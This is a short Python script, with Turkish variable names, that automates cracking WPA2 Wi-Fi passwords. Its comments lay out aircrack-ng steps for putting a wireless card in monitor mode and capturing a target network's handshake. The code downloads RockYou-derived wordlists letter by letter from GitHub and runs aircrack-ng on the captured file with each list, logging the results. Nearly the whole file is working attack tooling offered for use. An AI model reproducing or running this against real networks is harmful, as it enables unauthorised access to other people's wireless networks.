import requests
import os
import bs4

# sudo airmon-ng check kill
# sudo airmon-ng start wlan0
# sudo airodump-ng wlan0 -c KANAL-NUMBER --bssid MAC-ADDR -w test
# sudo aircrack-ng test-01.cap -w dsadas  -0

alfabe  = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
#fuzzing = "https://raw.githubusercontent.com/kennyn510/wpa2-wordlists/master/Wordlists/Ultimate2016/"
fuzzing = "https://raw.githubusercontent.com/kennyn510/wpa2-wordlists/master/Wordlists/Rockyou/"
pwd     = os.getcwd()

def scan():
    for alf in alfabe:
        if os.path.exists(f"{pwd}/{str(alf)}.txt"):
            pass
        else:
            contents = requests.get(f"{fuzzing}{str(alf)}.txt")
            soup = bs4.BeautifulSoup(contents.content, "html.parser")
            files = open(f'{pwd}/{str(alf)}.txt','w')
            files.write(str(soup.prettify()))
            files.close()
            
            dosya = f"{str(pwd)}/{str(alf)}.txt"
            os.system(f'sudo aircrack-ng {str(pwd)}/test-01.cap -w {str(dosya)} -0 >> kayit')

        os.remove(f"{str(pwd)}/{str(alf)}.txt")
        
if __name__ == "__main__":
    scan()